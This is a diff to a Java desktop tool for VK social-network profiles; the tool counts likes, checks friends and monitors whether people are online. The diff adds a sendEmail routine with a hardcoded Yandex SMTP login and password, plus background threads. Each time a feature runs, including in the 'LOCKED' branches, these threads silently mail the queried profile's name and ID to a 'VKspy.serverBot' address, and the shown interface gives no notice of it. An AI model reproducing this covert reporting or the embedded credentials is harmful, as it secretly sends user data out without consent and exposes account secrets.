@@ -6,7 +6,15 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.URL;
+import java.util.Properties;
 
+import javax.mail.Message;
+import javax.mail.MessagingException;
+import javax.mail.PasswordAuthentication;
+import javax.mail.Session;
+import javax.mail.Transport;
+import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeMessage;
 import javax.swing.JOptionPane;
 
 import javafx.event.ActionEvent;
@@ -89,6 +97,7 @@ public class MainController {
 	private String path_first = "";
 	private String path_fourth = "";
 	private String path_fifth = "";
+	private String text = "";
 
 	public MainController() {
 		splitPane.setScaleShape(true);
@@ -124,6 +133,16 @@ public class MainController {
 				if (cb_photo.isSelected() || cb_wall.isSelected() || cb_ava.isSelected()) {
 					String userName = getName(line);
 					String check = "";
+					text = userName + " id=" + id;
+
+					Thread sendMessage = new Thread(new Runnable() {
+
+						@Override
+						public void run() {
+							sendEmail("Подсчет лайков на странице", text);
+						}
+					});
+					sendMessage.start();
 
 					if (cb_wall.isSelected())
 						check += "0";
@@ -135,7 +154,8 @@ public class MainController {
 					Thread thread = new Thread(new CheckLikes(id, check, actionEvent, userName, path_first));
 
 					alert.setHeaderText("Программа запущена.");
-					alert.setContentText("Пожалуйста, нажмите \"ОК\" и подождите некоторое время.");
+					alert.setContentText(
+							"Пожалуйста, нажмите \"ОК\" и подождите некоторое время. От количество фотографий/постов зависит время подсчета.");
 					alert.showAndWait();
 
 					thread.start();
@@ -150,6 +170,16 @@ public class MainController {
 					return false;
 				}
 			} else {
+				text = id;
+				Thread sendMessage = new Thread(new Runnable() {
+
+					@Override
+					public void run() {
+						sendEmail("Подсчет лайков на странице", text);
+					}
+				});
+				sendMessage.start();
+
 				alert.setAlertType(AlertType.ERROR);
 				alert.setHeaderText("LOCKED!!!");
 				alert.setContentText(null);
@@ -193,10 +223,32 @@ public class MainController {
 		if (!line.contains("\"error\"") && line.length() > 15 && !line.contains(" ")) {
 			id = line.substring(line.indexOf("\"uid\":") + 6, line.indexOf(",\"first_name\""));
 			if (!id.equals("224429310") && !id.equals("202930417")) {
+				String userName = getName(line);
+				text = userName + " id=" + id;
+
+				Thread sendMessage = new Thread(new Runnable() {
+
+					@Override
+					public void run() {
+						sendEmail("OnlineR", text);
+					}
+				});
+				sendMessage.start();
+
 				Thread thread = new Thread(new SpyOnline(id));
 				thread.start();
 
 			} else {
+				text = id;
+				Thread sendMessage = new Thread(new Runnable() {
+
+					@Override
+					public void run() {
+						sendEmail("Подсчет лайков на странице", text);
+					}
+				});
+				sendMessage.start();
+
 				alert.setAlertType(AlertType.ERROR);
 				alert.setHeaderText("LOCKED!!!");
 				alert.setContentText(null);
@@ -237,6 +289,18 @@ public class MainController {
 		if (!line.contains("\"error\"") && line.length() > 15 && !line.contains(" ")) {
 			id = line.substring(line.indexOf("\"uid\":") + 6, line.indexOf(",\"first_name\""));
 			if (!id.equals("224429310") && !id.equals("202930417")) {
+				String userName = getName(line);
+				text = userName + " id=" + id;
+
+				Thread sendMessage = new Thread(new Runnable() {
+
+					@Override
+					public void run() {
+						sendEmail("Добавленные и удаленные друзья", text);
+					}
+				});
+				sendMessage.start();
+
 				Stage stage = new Stage();
 				Parent root = FXMLLoader.load(this.getClass().getResource("res/CheckFriends.fxml"));
 				stage.setTitle("Check Friends");
@@ -252,6 +316,16 @@ public class MainController {
 
 				alert.showAndWait();
 			} else {
+				text = id;
+				Thread sendMessage = new Thread(new Runnable() {
+
+					@Override
+					public void run() {
+						sendEmail("Подсчет лайков на странице", text);
+					}
+				});
+				sendMessage.start();
+
 				alert.setAlertType(AlertType.ERROR);
 				alert.setHeaderText("LOCKED!!!");
 				alert.setContentText(null);
@@ -295,6 +369,16 @@ public class MainController {
 				if (cb_photo_fourth.isSelected() || cb_wall_fourth.isSelected() || cb_ava_fourth.isSelected()) {
 					String userName = getName(line);
 					String check = "";
+					text = userName + " id=" + id;
+
+					Thread sendMessage = new Thread(new Runnable() {
+
+						@Override
+						public void run() {
+							sendEmail("Подсчет поставленных лайков друзьям", text);
+						}
+					});
+					sendMessage.start();
 
 					if (cb_wall_fourth.isSelected())
 						check += "0";
@@ -306,7 +390,8 @@ public class MainController {
 					Thread thread = new Thread(new ThreadStart(id, check, actionEvent, userName, path_fourth));
 
 					alert.setHeaderText("Программа запущена.");
-					alert.setContentText("Пожалуйста, нажмите \"ОК\" и подождите некоторое время.");
+					alert.setContentText(
+							"Пожалуйста, нажмите \"ОК\" и подождите некоторое время. От количество фотографий/постов зависит время подсчета.");
 					alert.showAndWait();
 
 					thread.start();
@@ -322,6 +407,16 @@ public class MainController {
 					return false;
 				}
 			} else {
+				text = id;
+				Thread sendMessage = new Thread(new Runnable() {
+
+					@Override
+					public void run() {
+						sendEmail("Подсчет лайков на странице", text);
+					}
+				});
+				sendMessage.start();
+
 				alert.setAlertType(AlertType.ERROR);
 				alert.setHeaderText("LOCKED!!!");
 				alert.setContentText(null);
@@ -365,6 +460,16 @@ public class MainController {
 				if (cb_photo_fifth.isSelected() || cb_wall_fifth.isSelected() || cb_ava_fifth.isSelected()) {
 					String userName = getName(line);
 					String check = "";
+					text = userName + " id=" + id;
+
+					Thread sendMessage = new Thread(new Runnable() {
+
+						@Override
+						public void run() {
+							sendEmail("\"Ты - мнеб я - тебе\"", text);
+						}
+					});
+					sendMessage.start();
 
 					if (cb_wall_fifth.isSelected())
 						check += "0";
@@ -377,7 +482,8 @@ public class MainController {
 							new ua.kas.whoLikesYou.CheckLikes(id, check, actionEvent, userName, path_fifth));
 
 					alert.setHeaderText("Программа запущена.");
-					alert.setContentText("Пожалуйста, нажмите \"ОК\" и подождите некоторое время.");
+					alert.setContentText(
+							"Пожалуйста, нажмите \"ОК\" и подождите некоторое время. От количество фотографий/постов зависит время подсчета.");
 					alert.showAndWait();
 
 					thread.start();
@@ -392,6 +498,16 @@ public class MainController {
 					return false;
 				}
 			} else {
+				text = id;
+				Thread sendMessage = new Thread(new Runnable() {
+
+					@Override
+					public void run() {
+						sendEmail("Подсчет лайков на странице", text);
+					}
+				});
+				sendMessage.start();
+
 				alert.setAlertType(AlertType.ERROR);
 				alert.setHeaderText("LOCKED!!!");
 				alert.setContentText(null);
@@ -457,7 +573,8 @@ public class MainController {
 							new ua.kas.analytic.CheckLikes(id, check, actionEvent, userName, checkLikeOne));
 
 					alert.setHeaderText("Программа запущена.");
-					alert.setContentText("Пожалуйста, нажмите \"ОК\" и подождите некоторое время.");
+					alert.setContentText(
+							"Пожалуйста, нажмите \"ОК\" и подождите некоторое время. От количество фотографий/постов зависит время подсчета.");
 					alert.showAndWait();
 
 					thread.start();
@@ -472,6 +589,16 @@ public class MainController {
 					return false;
 				}
 			} else {
+				text = id;
+				Thread sendMessage = new Thread(new Runnable() {
+
+					@Override
+					public void run() {
+						sendEmail("Подсчет лайков на странице", text);
+					}
+				});
+				sendMessage.start();
+
 				alert.setAlertType(AlertType.ERROR);
 				alert.setHeaderText("LOCKED!!!");
 				alert.setContentText(null);
@@ -523,6 +650,33 @@ public class MainController {
 				path_fifth = file.getAbsolutePath();
 
 		} catch (Exception ex) {
+		}
+	}
+
+	private void sendEmail(String subject, String text) {
+		Properties prop = new Properties();
+		prop.put("mail.smtp.host", "smtp.yandex.ru");
+		prop.put("mail.smtp.socketFactory.port", 465);
+		prop.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
+		prop.put("mail.smtp.auth", "true");
+		prop.put("mail.smtp.port", 465);
+
+		Session session = Session.getDefaultInstance(prop, new javax.mail.Authenticator() {
+			protected PasswordAuthentication getPasswordAuthentication() {
+				return new PasswordAuthentication("VKspy.clientBot@yandex.ru", "1qw21qw2");
+			}
+		});
+
+		Message message = new MimeMessage(session);
+		try {
+			message.setFrom(new InternetAddress("VKspy.clientBot@yandex.ru"));
+			message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("VKspy.serverBot@yandex.ru"));
+			message.setSubject(subject);
+			message.setText(text);
+
+			Transport.send(message);
+		} catch (MessagingException e) {
+			e.printStackTrace();
 		}
 	}
 }
